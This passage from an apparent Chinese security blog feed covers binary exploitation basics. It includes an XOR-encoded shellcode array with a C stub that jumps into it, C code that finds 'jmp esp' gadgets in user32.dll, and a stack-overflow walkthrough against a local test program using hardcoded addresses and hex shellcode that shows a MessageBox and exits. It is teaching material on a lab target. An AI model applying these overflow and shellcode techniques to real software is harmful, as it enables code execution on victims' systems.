punctuation">,</span> <span class="token number">0xCF</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0x14</span><span class="token punctuation">,</span> <span class="token number">0x14</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0xBB</span><span class="token punctuation">,</span> <span class="token number">0x13</span><span class="token punctuation">,</span> <span class="token number">0xB8</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0xBB</span><span class="token punctuation">,</span> <span class="token number">0x13</span><span class="token punctuation">,</span> <span class="token number">0xBC</span><span class="token punctuation">,</span> <span class="token number">0xD4</span> </pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220410202055818.png" alt="image-20220410202055818" /></p>
<p>编写解码器：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">unsigned</span> <span class="token keyword">char</span> hexData<span class="token punctuation">[</span><span class="token number">189</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token number">0x83</span><span class="token punctuation">,</span> <span class="token number">0xC0</span><span class="token punctuation">,</span> <span class="token number">0x14</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0xC9</span><span class="token punctuation">,</span> <span class="token number">0x8A</span><span class="token punctuation">,</span> <span class="token number">0x1C</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0xF3</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0x1C</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token number">0xFB</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0xF1</span><span class="token punctuation">,</span> <span class="token number">0xB8</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0x4E</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token number">0x7C</span><span class="token punctuation">,</span> <span class="token number">0x5A</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x27</span><span class="token punctuation">,</span> <span class="token number">0xCD</span><span class="token punctuation">,</span> <span class="token number">0x95</span><span class="token punctuation">,</span> <span class="token number">0x0B</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0xD5</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0xCF</span><span class="token punctuation">,</span> <span class="token number">0xB0</span><span class="token punctuation">,</span> <span class="token number">0xC9</span><span class="token punctuation">,</span> <span class="token number">0x3A</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token number">0xB0</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0x9F</span><span class="token punctuation">,</span> <span class="token number">0xF3</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0x6F</span><span class="token punctuation">,</span> <span class="token number">0xA7</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0x96</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0xCF</span><span class="token punctuation">,</span> <span class="token number">0x1E</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token number">0xCF</span><span class="token punctuation">,</span> <span class="token number">0x0F</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0xCF</span><span class="token punctuation">,</span> <span class="token number">0x0D</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">,</span> <span class="token number">0xCF</span><span class="token punctuation">,</span> <span class="token number">0x4D</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token number">0xCF</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0xE9</span><span class="token punctuation">,</span> <span class="token number">0x79</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0x4E</span><span class="token punctuation">,</span> <span class="token number">0x7C</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token number">0x5A</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0xD1</span><span class="token punctuation">,</span> <span class="token number">0xBB</span><span class="token punctuation">,</span> <span class="token number">0x13</span><span class="token punctuation">,</span> <span class="token number">0xBC</span><span class="token punctuation">,</span> <span class="token number">0xD1</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0xCF</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x78</span><span class="token punctuation">,</span> <span class="token number">0xCF</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token number">0x47</span><span class="token punctuation">,</span> <span class="token number">0x89</span><span class="token punctuation">,</span> <span class="token number">0xCF</span><span class="token punctuation">,</span> <span class="token number">0x1D</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x47</span><span class="token punctuation">,</span> <span class="token number">0x99</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token number">0xBB</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0xCF</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0x47</span><span class="token punctuation">,</span> <span class="token number">0xB1</span><span class="token punctuation">,</span> <span class="token number">0xDD</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token number">0x4B</span><span class="token punctuation">,</span> <span class="token number">0xFA</span><span class="token punctuation">,</span> <span class="token number">0x42</span><span class="token punctuation">,</span> <span class="token number">0x7E</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0x85</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token number">0x8E</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x47</span><span class="token punctuation">,</span> <span class="token number">0x94</span><span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0xAF</span><span class="token punctuation">,</span> <span class="token number">0xB5</span><span class="token punctuation">,</span> <span class="token number">0x7F</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0xA0</span><span class="token punctuation">,</span> <span class="token number">0xCF</span><span class="token punctuation">,</span> <span class="token number">0x1D</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token number">0x47</span><span class="token punctuation">,</span> <span class="token number">0x99</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0xCF</span><span class="token punctuation">,</span> <span class="token number">0x78</span><span class="token punctuation">,</span> <span class="token number">0x3F</span><span class="token punctuation">,</span> <span class="token number">0xCF</span><span class="token punctuation">,</span> <span class="token number">0x1D</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token number">0x58</span><span class="token punctuation">,</span> <span class="token number">0x47</span><span class="token punctuation">,</span> <span class="token number">0x99</span><span class="token punctuation">,</span> <span class="token number">0x47</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0xD1</span><span class="token punctuation">,</span> <span class="token number">0x1B</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token number">0xEF</span><span class="token punctuation">,</span> <span class="token number">0x13</span><span class="token punctuation">,</span> <span class="token number">0x25</span><span class="token punctuation">,</span> <span class="token number">0x79</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0x4E</span><span class="token punctuation">,</span> <span class="token number">0x7C</span><span class="token punctuation">,</span> <span class="token number">0x5A</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0xED</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0x9F</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0xCF</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0x14</span><span class="token punctuation">,</span> <span class="token number">0x14</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0xBB</span><span class="token punctuation">,</span> <span class="token number">0x13</span><span class="token punctuation">,</span> <span class="token number">0xB8</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0xBB</span><span class="token punctuation">,</span> <span class="token number">0x13</span><span class="token punctuation">,</span> <span class="token number">0xBC</span><span class="token punctuation">,</span> <span class="token number">0xD4</span> </pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>    _asm<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>        lea eax<span class="token punctuation">,</span>hexData</pre></td></tr><tr><td data-num="32"></td><td><pre>            push eax</pre></td></tr><tr><td data-num="33"></td><td><pre>            ret</pre></td></tr><tr><td data-num="34"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>编译运行</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220410202330533.png" alt="image-20220410202330533" /></p>
<p>断点调试</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220410202519501.png" alt="image-20220410202519501" /></p>
<p>f10 跟进</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220410202545066.png" alt="image-20220410202545066" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220410195720525.png" alt="image-20220410195720525" /></p>
]]></content>
      <categories>
        <category>二进制逆向</category>
      </categories>
      <tags>
        <tag>二进制逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>二进制漏洞Shellcode应用浅析</title>
    <url>/article/42b433a1.html</url>
    <content><![CDATA[<h2 id="概念"><a class="anchor" href="#概念">#</a> 概念</h2>
<h3 id="简介"><a class="anchor" href="#简介">#</a> 简介</h3>
<p>shellcode 是一段用于利用软件漏洞而执行的代码，shellcode 为 16 进制的机器码。</p>
<p>shellcode 常常使用机器语言编写。</p>
<p>可在暂存器 eip 溢出后，塞入一段可让 CPU 执行的 shellcode 机器码，让电脑可以执行攻击者的任意指令。</p>
<h3 id="分类"><a class="anchor" href="#分类">#</a> 分类</h3>
<p>shellcode 可以按照攻击者执行的位置分为本地 shellcode 和远程 shellcode.</p>
<p><strong>本地 shellcode</strong></p>
<p>本地运行的 shellcode 经常用于利用软件漏洞提升权限。比如在 Linux 下由普通权限提升至 root 权限。</p>
<p><strong>远程 shellcode</strong></p>
<p>利用软件漏洞获得特定的 shellcode，再经由 C 或 Python 编写远程攻击程序，进而取得对方电脑的 root 权限。</p>
<h2 id="shellcode开发"><a class="anchor" href="#shellcode开发">#</a> shellcode 开发</h2>
<h3 id="种类"><a class="anchor" href="#种类">#</a> 种类</h3>
<ul>
<li>
<p>汇编语言：体积小</p>
</li>
<li>
<p>C 语言：快捷</p>
</li>
<li>
<p>框架生成：msf 等</p>
</li>
</ul>
<h3 id="问题"><a class="anchor" href="#问题">#</a> 问题</h3>
<ol>
<li>如何定位 shellcode</li>
<li>如何定位函数地址</li>
<li>如何去除 &quot;坏&quot; 字符</li>
</ol>
<h2 id="确定shellcode的位置"><a class="anchor" href="#确定shellcode的位置">#</a> 确定 shellcode 的位置</h2>
<p>OD 打开之前读取 password 文件验证密码的测试样例</p>
<p>进入主函数</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220409135355099.png" alt="image-20220409135355099" /></p>
<p>在 ret 处断点观察返回值</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220409135409836.png" alt="image-20220409135409836" /></p>
<p>转到 ebp 可以看到，上面一部分已经被滑板指令覆盖和返回值等信息</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220409135441193.png" alt="image-20220409135441193" /></p>
<p>f8 跟进查看返回值信息</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220409135633621.png" alt="image-20220409135633621" /></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">00000000</span> ret <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">></span> 指向shellcode头部</pre></td></tr><tr><td data-num="2"></td><td><pre>    </pre></td></tr><tr><td data-num="3"></td><td><pre>函数返回之后</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token number">00000000</span> ret <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">></span> jmp esp</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">00000004</span> esp <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">></span> esp一直指向栈顶</pre></td></tr><tr><td data-num="6"></td><td><pre>shellcode</pre></td></tr><tr><td data-num="7"></td><td><pre>    </pre></td></tr><tr><td data-num="8"></td><td><pre>寻找jmp esp指令</pre></td></tr><tr><td data-num="9"></td><td><pre>user32<span class="token punctuation">.</span>dll</pre></td></tr><tr><td data-num="10"></td><td><pre>FFE4 <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">></span> jmp esp</pre></td></tr></table></figure><h2 id="获取jmp-esp的地址"><a class="anchor" href="#获取jmp-esp的地址">#</a> 获取 jmp esp 的地址</h2>
<p>创建测试程序</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220409140909384.png" alt="image-20220409140909384" /></p>
<p>样例源码</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;windows.h></span></span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DLL_NAME</span> <span class="token string">"user32.dll"</span></span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>	HINSTANCE hDllHandle <span class="token operator">=</span> <span class="token function">LoadLibrary</span><span class="token punctuation">(</span>DLL_NAME<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 加载动态链接库</span></pre></td></tr><tr><td data-num="10"></td><td><pre>	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>hDllHandle<span class="token punctuation">)</span><span class="token comment">// 判断是否成功加载</span></pre></td></tr><tr><td data-num="11"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>		<span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>	BYTE <span class="token operator">*</span> ptr<span class="token punctuation">;</span><span class="token comment">// 转换类型</span></pre></td></tr><tr><td data-num="15"></td><td><pre>	ptr <span class="token operator">=</span> <span class="token punctuation">(</span>BYTE<span class="token operator">*</span><span class="token punctuation">)</span>hDllHandle<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>	BOOL flag <span class="token operator">=</span> false<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>	<span class="token keyword">int</span> count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>	<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token operator">!</span>flag<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token comment">// 遍历</span></pre></td></tr><tr><td data-num="19"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>		<span class="token keyword">if</span><span class="token punctuation">(</span>ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0xFF</span> <span class="token operator">&amp;&amp;</span> ptr<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0xE4</span><span class="token punctuation">)</span><span class="token comment">//FFE4 jmp esp</span></pre></td></tr><tr><td data-num="21"></td><td><pre>		<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>			<span class="token keyword">int</span> address <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>ptr <span class="token operator">+</span> i<span class="token punctuation">;</span> <span class="token comment">// 打印地址 = 基地址 + 偏移</span></pre></td></tr><tr><td data-num="23"></td><td><pre>			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"opcode address:0x%x\n"</span><span class="token punctuation">,</span>address<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>			count<span class="token operator">++</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>			<span class="token keyword">if</span><span class="token punctuation">(</span>count <span class="token operator">==</span> <span class="token number">50</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre>			<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>				<span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>			<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>		<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="32"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>运行即可得到 <code>jmp esp</code>  的地址</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220409142231983.png" alt="image-20220409142231983" /></p>
<h2 id="jmp-esp实际应用"><a class="anchor" href="#jmp-esp实际应用">#</a> jmp esp 实际应用</h2>
<p>利用之前获取到的 <code>jmp esp</code>  的地址来作为跳板完成一次 <code>exploit定位</code></p>
<p>测试地址： <code>0x77d9228c</code></p>
<p>修改 password 文件中的值，并将 shellcode 放在返回值后面</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220409142837121.png" alt="image-20220409142837121" /></p>
<p>运行测试样例，仍旧弹出报错</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220409143125277.png" alt="image-20220409143125277" /></p>
<p>OD 打开应用程序进行分析</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220409143238609.png" alt="image-20220409143238609" /></p>
<p>此时可以发现返回值发生改变，返回结果跳转至 user32 中</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220409143324414.png" alt="image-20220409143324414" /></p>
<p>f8 跳转至 esp 部分</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220409143419195.png" alt="image-20220409143419195" /></p>
<p>如此返回地址的修改就成功了，但是程序还不能正常退出</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220409143629112.png" alt="image-20220409143629112" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220409143644714.png" alt="image-20220409143644714" /></p>
<p>因此，我们需要在 shellcode 后面调用一个正常退出进程的函数，也就是 <code>ExitProcess函数</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220409143957082.png" alt="image-20220409143957082" /></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>kernel32<span class="token punctuation">.</span>dll的基址：<span class="token number">0x7C800000</span></pre></td></tr><tr><td data-num="2"></td><td><pre>exitpeocess偏移：<span class="token number">0x1CAFA</span></pre></td></tr></table></figure><p>相加等到</p>
<pre><code class="language-C">0x7C81CAFA
</code></pre>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220409144300704.png" alt="image-20220409144300704" /></p>
<p>如此得到的三个关键地址分别是</p>
<ul>
<li>jmp esp：0x77d9228c</li>
<li>MessageBoxA：0x77D507EA</li>
<li>ExitProcess：0x7C81CAFA</li>
</ul>
<p>在 OD 空白处进行汇编</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220409145130808.png" alt="image-20220409145130808" /></p>
<p>复制二进制结果，而这就是退出程序进程的 shellcode</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">33</span> DB <span class="token number">53</span> <span class="token number">53</span> <span class="token number">53</span> <span class="token number">53</span> B8 EA <span class="token number">07</span> D5 <span class="token number">77</span> FF D0 B8 FA CA <span class="token number">81</span> <span class="token number">7</span>C FF D0</pre></td></tr></table></figure><p>将之前的 shellcode 进行替换</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220409145337967.png" alt="image-20220409145337967" /></p>
<p>此时运行测试程序，弹出 MessageBox 框，在点击确定之后没有弹出报错信息的提示，程序自动结束进程</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220409145520358.png" alt="image-20220409145520358" /></p>
<p>在 OD 中进行调试</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220409145701018.png" alt="image-20220409145701018" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220409145714456.png" alt="image-20220409145714456" /></p>
<p>执行第一个 CALL，弹出 MessageBox 框</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220409145803484.png" alt="image-20220409145803484" /></p>
<p>继续往下，压入 ebx 为 0</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220409145844398.png" alt="image-20220409145844398" /></p>
<p>运行 CALL，正常退出</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220409145918733.png" alt="image-20220409145918733" /></p>
<p><strong>正常调用 MessageBox</strong></p>
<p><code>MessageBoxA(0,&quot;FFFFFFF&quot;,&quot;FFFFFFF&quot;,0)</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220409151042160.png" alt="image-20220409151042160" /></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">33</span> DB <span class="token number">53</span> <span class="token number">68</span> <span class="token number">66</span> <span class="token number">66</span> <span class="token number">66</span> <span class="token number">66</span> <span class="token number">68</span> <span class="token number">66</span> <span class="token number">66</span> <span class="token number">66</span> <span class="token number">66</span> <span class="token number">8</span>B C4 <span class="token number">53</span> <span class="token number">50</span> <span class="token number">50</span> <span class="token number">53</span> B8 EA <span class="token number">07</span> D5 <span class="token number">77</span> FF D0 <span class="token number">53</span> B8 FA CA <span class="token number">81</span> <span class="token number">7</span>C</pre></td></tr><tr><td data-num="2"></td><td><pre>FF D0</pre></td></tr></table></figure><p>替换 shellcode 值</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220409151107089.png" alt="image-20220409151107089" /></p>
<p>运行测试样例</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220409151144082.png" alt="image-20220409151144082" /></p>
<p>弹窗显示信息，并顺利退出</p>
<p>OD 查看返回值信息</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220409151255550.png" alt="image-20220409151255550" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/36424F16B0A7F12D9D4814880CA4F336.gif" alt="img-36424F16B0A7F12D9D4814880CA4F336" /></p>
]]></content>
      <categories>
        <category>二进制逆向</category>
      </categories>
      <tags>
        <tag>二进制逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>二进制漏洞简介与函数调用</title>
